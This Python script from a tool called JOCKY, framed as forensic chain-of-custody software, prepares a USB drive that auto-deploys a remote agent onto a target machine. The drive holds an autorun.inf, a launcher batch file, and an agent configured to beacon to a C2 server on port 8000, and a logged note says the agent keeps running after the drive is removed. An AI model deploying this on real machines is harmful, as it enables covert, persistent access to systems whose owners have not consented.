"""
usb_deploy.py -- JOCKY USB Deployment & COC Manager
====================================================
Run on the INVESTIGATOR machine BEFORE plugging in USB.

What it does:
  1. Creates a new investigation case in the blockchain (INVESTIGATION_START block)
  2. Writes the C2 IP into c2_config.txt on the USB
  3. Packages the latest jocky_agent.exe onto the USB
  4. Logs USB_PREPARED block to COC chain
  5. Monitors for the agent to connect (AGENT_DEPLOYED block auto-logged)
  6. When USB is unplugged, logs USB_REMOVED block

The investigator NEVER touches the target machine.
Every action from this point is logged to the blockchain.

Usage:
  python usb_deploy.py --case NTRO-2026-001 --investigator "INV-ALPHA" --usb E:
  python usb_deploy.py --case NTRO-2026-001 --investigator "INV-ALPHA" --usb E: --c2 192.168.1.100

Then plug the USB into the target machine and walk away.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import platform
import shutil
import socket
import sys
import time
import threading
from datetime import datetime, timezone
from pathlib  import Path
from typing   import Optional

# ── path bootstrap ─────────────────────────────────────────────────────────
_HERE = Path(__file__).resolve().parent
_ROOT = _HERE.parent
for _p in [str(_ROOT), str(_ROOT / "integrity"), str(_ROOT / "server")]:
    if _p not in sys.path:
        sys.path.insert(0, _p)

from blockchain import ForensicBlockchain

# ── helpers ─────────────────────────────────────────────────────────────────
def _utcnow() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""): h.update(chunk)
    return h.hexdigest()

def _get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def _print_banner(case_id: str, investigator: str, usb: str, c2_ip: str):
    print()
    print("=" * 60)
    print("  JOCKY — USB Forensic Deployment")
    print("=" * 60)
    print(f"  Case ID:      {case_id}")
    print(f"  Investigator: {investigator}")
    print(f"  USB Drive:    {usb}")
    print(f"  C2 Server:    http://{c2_ip}:8000")
    print(f"  Time:         {_utcnow()}")
    print("=" * 60)
    print()

# ── USB prep ─────────────────────────────────────────────────────────────────
def prepare_usb(usb_path: Path,
                c2_ip: str,
                agent_exe: Path) -> dict:
    """
    Copy agent + config to USB. Return file inventory for COC block.
    """
    print(f"[usb] preparing drive: {usb_path}")

    # write C2 config
    cfg = usb_path / "c2_config.txt"
    cfg.write_text(f"http://{c2_ip}:8000\n", encoding="utf-8")
    print(f"[usb] c2_config.txt written: http://{c2_ip}:8000")

    # copy agent
    dest_exe = usb_path / "jocky_agent.exe"
    if agent_exe.exists():
        shutil.copy2(agent_exe, dest_exe)
        agent_hash = _sha256_file(dest_exe)
        print(f"[usb] jocky_agent.exe copied  sha256={agent_hash[:16]}...")
    else:
        # write a placeholder bat that runs python agent as fallback
        fallback = usb_path / "jocky_agent.bat"
        fallback.write_text(
            f'@echo off\n'
            f'python "%~dp0agent_main.py" --c2 http://{c2_ip}:8000 --interval 60 --usb-deploy\n',
            encoding="utf-8"
        )
        # copy python agent files
        agent_main = _ROOT / "agent" / "main.py"
        agent_coll = _ROOT / "agent" / "collector.py"
        if agent_main.exists():
            shutil.copy2(agent_main,  usb_path / "agent_main.py")
        if agent_coll.exists():
            shutil.copy2(agent_coll, usb_path / "collector.py")
        agent_hash = "python-fallback"
        print(f"[usb] python fallback agent written (no .exe found)")
        print(f"[usb] target needs Python -- run build_agent.bat first for .exe")

    # copy launcher
    launcher_src = _HERE / "launcher.bat"
    if launcher_src.exists():
        shutil.copy2(launcher_src, usb_path / "launcher.bat")

    # autorun.inf
    autorun = usb_path / "autorun.inf"
    autorun.write_text(
        "[AutoRun]\nlabel=JOCKY_FORENSIC\nopen=launcher.bat\n"
        "action=Open folder to view files\n",
        encoding="utf-8"
    )

    inventory = {
        "files_written": ["c2_config.txt", "jocky_agent.exe",
                          "launcher.bat", "autorun.inf"],
        "agent_sha256":  agent_hash,
        "c2_endpoint":   f"http://{c2_ip}:8000",
        "usb_path":      str(usb_path),
    }
    print(f"[usb] drive ready -- plug into target machine")
    return inventory

# ── USB monitor ──────────────────────────────────────────────────────────────
class USBMonitor:
    """
    Watches for USB drive to be removed (Windows only via ctypes).
    Falls back to polling on other platforms.
    Fires callback on eject.
    """

    def __init__(self, drive_letter: str, on_eject):
        self._drive  = drive_letter.rstrip("\\").rstrip("/")
        self._cb     = on_eject
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._watch, daemon=True)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop.set()

    def _watch(self):
        drive_path = Path(self._drive + "\\")
        was_present = drive_path.exists()
        while not self._stop.is_set():
            now_present = drive_path.exists()
            if was_present and not now_present:
                self._cb()
                break
            was_present = now_present
            time.sleep(2)

# ── C2 agent poller ──────────────────────────────────────────────────────────
class AgentPoller:
    """
    Polls C2 /agents endpoint to detect when the USB agent connects.
    Fires on_connected(agent_info) when a new agent appears.
    """

    def __init__(self, c2_ip: str, on_connected, known_agents: set):
        self._c2   = f"http://{c2_ip}:8000"
        self._cb   = on_connected
        self._known = known_agents
        self._stop  = threading.Event()
        self._thread = threading.Thread(target=self._poll, daemon=True)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop.set()

    def _poll(self):
        import urllib.request
        while not self._stop.is_set():
            try:
                with urllib.request.urlopen(
                        f"{self._c2}/agents", timeout=5) as r:
                    data = json.loads(r.read())
                    agents = data.get("agents", {})
                    for aid, info in agents.items():
                        if aid not in self._known:
                            self._known.add(aid)
                            self._cb(aid, info)
            except Exception:
                pass
            time.sleep(5)

# ── main ─────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        prog="usb_deploy",
        description="JOCKY USB forensic deployment + chain of custody manager"
    )
    ap.add_argument("--case",         required=True,
                    help="Case ID  e.g. NTRO-2026-001")
    ap.add_argument("--investigator", required=True,
                    help="Investigator ID  e.g. INV-ALPHA")
    ap.add_argument("--usb",          required=True,
                    help="USB drive letter/path  e.g. E: or /media/usb")
    ap.add_argument("--c2",           default=None,
                    help="C2 IP (auto-detected if omitted)")
    ap.add_argument("--agent-exe",    default=None,
                    help="Path to jocky_agent.exe (auto-found if omitted)")
    ap.add_argument("--no-monitor",   action="store_true",
                    help="Skip USB eject monitoring")
    args = ap.parse_args()

    # resolve paths
    usb_path  = Path(args.usb)
    if not usb_path.exists():
        print(f"[-] USB path not found: {usb_path}")
        sys.exit(1)

    c2_ip = args.c2 or _get_local_ip()

    agent_exe = Path(args.agent_exe) if args.agent_exe else (
        _ROOT / "dist" / "jocky_agent.exe"
    )

    _print_banner(args.case, args.investigator, str(usb_path), c2_ip)

    # ── init blockchain ───────────────────────────────────────────────────────
    evidence_dir = _ROOT / "evidence"
    evidence_dir.mkdir(exist_ok=True)

    chain_file = evidence_dir / f"coc_{args.case}.json"
    key_file   = evidence_dir / f"inv_key_{args.investigator}.pem"

    print(f"[coc] initialising blockchain for case {args.case}...")
    bc = ForensicBlockchain(
        case_id      = args.case,
        investigator = args.investigator,
        chain_file   = str(chain_file),
        key_file     = str(key_file),
    )
    print(f"[coc] chain ready: {bc.length} existing blocks")

    # ── USB preparation + COC block ───────────────────────────────────────────
    print()
    print("[*] Step 1 — Preparing USB drive...")
    inventory = prepare_usb(usb_path, c2_ip, agent_exe)

    bc.add_event("AGENT_DEPLOYED", {
        "action":        "USB_PREPARED",
        "usb_path":      inventory["usb_path"],
        "agent_sha256":  inventory["agent_sha256"],
        "c2_endpoint":   inventory["c2_endpoint"],
        "files":         inventory["files_written"],
        "investigator":  args.investigator,
        "prepared_at":   _utcnow(),
        "method":        "USB_AUTO_DEPLOY",
        "instruction":   "Plug USB into target. No further action on target required.",
    })
    print(f"[coc] block logged: USB_PREPARED")

    # ── agent connection monitor ──────────────────────────────────────────────
    print()
    print("[*] Step 2 — Waiting for agent to connect...")
    print(f"    Plug the USB drive into the target machine now.")
    print(f"    Watching {c2_ip}:8000 for new agent connections...")
    print()

    known_agents: set = set()
    connected_agents: list = []

    def on_agent_connected(agent_id: str, info: dict):
        connected_agents.append(agent_id)
        hostname = info.get("hostname", "unknown")
        platform_str = info.get("platform", "")
        print(f"\n[!!!] AGENT CONNECTED: {agent_id}")
        print(f"      Hostname: {hostname}")
        print(f"      Platform: {platform_str}")
        print(f"      Time:     {_utcnow()}")

        bc.add_event("AGENT_DEPLOYED", {
            "action":     "AGENT_CONNECTED",
            "agent_id":   agent_id,
            "hostname":   hostname,
            "platform":   platform_str,
            "via":        "USB_AUTO_DEPLOY",
            "connected_at": _utcnow(),
        })
        print(f"[coc] block logged: AGENT_CONNECTED ({agent_id})")

    poller = AgentPoller(c2_ip, on_agent_connected, known_agents)
    poller.start()

    # ── USB eject monitor ─────────────────────────────────────────────────────
    def on_usb_ejected():
        print(f"\n[usb] USB drive removed at {_utcnow()}")
        bc.add_event("TASK_DISPATCHED", {
            "action":    "USB_REMOVED",
            "usb_path":  str(usb_path),
            "removed_at": _utcnow(),
            "agents_connected": connected_agents,
            "note": "USB removed from target. Agent continues running independently.",
        })
        print(f"[coc] block logged: USB_REMOVED")

    if not args.no_monitor and platform.system() == "Windows":
        monitor = USBMonitor(args.usb, on_usb_ejected)
        monitor.start()
        print(f"[usb] monitoring drive {args.usb} for eject...")
    else:
        print(f"[usb] eject monitoring: manual (press Ctrl+C when done)")

    # ── interactive wait loop ─────────────────────────────────────────────────
    print()
    print("-" * 60)
    print("  JOCKY is running. Commands:")
    print("  [v] verify COC chain")
    print("  [s] show chain summary")
    print("  [c] close investigation")
    print("  [q] quit (investigation stays open)")
    print("-" * 60)
    print()

    try:
        while True:
            try:
                cmd = input("jocky> ").strip().lower()
            except EOFError:
                time.sleep(5)
                continue

            if cmd == "v":
                ok, report = bc.verify()
                print(report)

            elif cmd == "s":
                s = bc.summary()
                print(f"\n  Case:        {s['case_id']}")
                print(f"  Blocks:      {s['blocks']}")
                print(f"  Events:      {json.dumps(s['events'], indent=4)}")
                print(f"  Latest hash: {s['latest_hash'][:24]}...")
                print()

            elif cmd == "c":
                bc.add_event("INVESTIGATION_CLOSED", {
                    "closed_at":       _utcnow(),
                    "total_blocks":    bc.length,
                    "agents_deployed": connected_agents,
                    "investigator":    args.investigator,
                })
                ok, report = bc.verify()
                print(report)
                print(f"\n[coc] investigation {args.case} closed")
                print(f"[coc] chain file: {chain_file}")
                break

            elif cmd == "q":
                print(f"[coc] investigation left open -- chain saved to {chain_file}")
                break

            else:
                print("  commands: v=verify  s=summary  c=close  q=quit")

    except KeyboardInterrupt:
        print(f"\n[coc] interrupted -- chain saved to {chain_file}")

    poller.stop()
    print("\n[*] USB deployment session ended")
    print(f"[*] COC chain: {chain_file}")
    print(f"[*] Blocks:    {bc.length}")

if __name__ == "__main__":
    main()